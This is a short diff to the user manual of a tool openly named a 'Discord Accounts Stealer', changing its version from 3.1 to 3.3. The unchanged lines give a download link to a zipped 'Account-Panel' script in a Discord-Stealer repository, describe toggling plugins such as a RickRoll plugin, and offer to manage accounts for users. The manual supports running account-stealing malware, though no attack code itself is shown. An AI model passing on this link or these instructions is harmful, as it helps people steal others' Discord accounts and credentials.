@@ -1,5 +1,5 @@
 <Account-Management-User-Manual>
-<Version-3.1>
+<Version-3.3>
 
 ### ⚙️ How can I manage my account's settings?
 - **Download the [script](https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/Account-Panel.zip) which will allow you to login to your account's panel**
@@ -26,4 +26,4 @@ _you can ask us to manage your account if you feel like you don't trust the scri
 - Example: if you press 4 and enter, RickRoll plugin will turn on _(or off)_
 
 
-##### ℹ️ Account Management User Manual For Discord Accounts Stealer Version 3.1
+##### ℹ️ Account Management User Manual For Discord Accounts Stealer Version 3.3
